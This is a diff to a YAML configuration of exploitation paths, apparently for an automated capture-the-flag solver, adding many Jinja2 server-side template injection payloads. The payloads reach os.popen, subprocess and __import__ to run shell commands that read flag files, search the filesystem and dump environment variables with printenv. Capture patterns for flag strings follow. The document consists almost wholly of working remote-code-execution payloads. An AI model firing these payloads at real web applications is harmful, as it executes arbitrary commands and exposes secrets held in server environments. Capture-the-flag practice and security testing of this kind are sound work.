@@ -153,20 +153,34 @@ exploitation_paths:
             - "{{cycler.__init__.__globals__['__builtins__']['open']('/flag').read()}}"
             - "{{lipsum.__globals__['__builtins__']['open']('/flag.txt').read()}}"
             - "{{lipsum.__globals__['__builtins__']['open']('/flag').read()}}"
-            - "{{cycler.__init__.__globals__['os'].popen('find / -name flag* -maxdepth 5 2>/dev/null | head -5').read()}}"
             - "{{cycler.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('cat /app/flag').read()}}"
             - "{{cycler.__init__.__globals__['os'].popen('cat /challenge/flag.txt').read()}}"
-            - "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('cat /challenge/flag').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('find / -name flag.txt -maxdepth 6 2>/dev/null | head -3 | xargs cat 2>/dev/null').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('env | grep -i flag').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('env | grep -i CTF').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('env | grep -i pico').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('printenv').read()}}"
+            - "{{lipsum.__globals__['os'].popen('cat /app/flag.txt').read()}}"
+            - "{{lipsum.__globals__['os'].popen('cat /app/flag').read()}}"
+            - "{{lipsum.__globals__['os'].popen('env | grep -i flag').read()}}"
             - "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"
+            - "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}"
+            - "{{config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}"
+            - "{{config.__class__.__init__.__globals__['os'].popen('cat /app/flag').read()}}"
+            - "{{config.__class__.__init__.__globals__['os'].popen('env | grep -i flag').read()}}"
             - "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}"
+            - "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}"
+            - "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read()}}"
+            - "{{request.application.__globals__.__builtins__.__import__('os').popen('env | grep -i flag').read()}}"
+            - "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /flag.txt',shell=True,stdout=-1).communicate()[0].decode()}}"
         capture:
           - pattern: 'picoCTF\{[^}]+\}'
             as: flag_value
           - pattern: 'flag\{[^}]+\}'
             as: flag_value
           - pattern: 'CTF\{[^}]+\}'
-            as: flag_value
-          - pattern: '[A-Z0-9_]{20,}'
             as: flag_value
 
   - id: twig_rce
@@ -226,11 +240,24 @@ exploitation_paths:
           payloads:
             - "{{cycler.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"
             - "{{cycler.__init__.__globals__['os'].popen('cat /flag').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('cat /app/flag').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('cat /challenge/flag.txt').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('cat /challenge/flag').read()}}"
             - "{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}"
             - "{{lipsum.__globals__['os'].popen('cat /flag').read()}}"
+            - "{{lipsum.__globals__['os'].popen('cat /app/flag.txt').read()}}"
+            - "{{lipsum.__globals__['os'].popen('cat /app/flag').read()}}"
             - "{{joiner.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"
-            - "{{cycler.__init__.__globals__['os'].popen('find / -name flag* -maxdepth 5 2>/dev/null | head -5').read()}}"
-            - "{{cycler.__init__.__globals__['os'].popen('ls /').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('env | grep -i flag').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('env | grep -i CTF').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('env | grep -i pico').read()}}"
+            - "{{lipsum.__globals__['os'].popen('env | grep -i flag').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('find / -name flag.txt -maxdepth 6 2>/dev/null | head -3 | xargs cat 2>/dev/null').read()}}"
+            - "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"
+            - "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}"
+            - "{{config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}"
+            - "{{config.__class__.__init__.__globals__['os'].popen('env | grep -i flag').read()}}"
         capture:
           - pattern: 'picoCTF\{[^}]+\}'
             as: flag_value
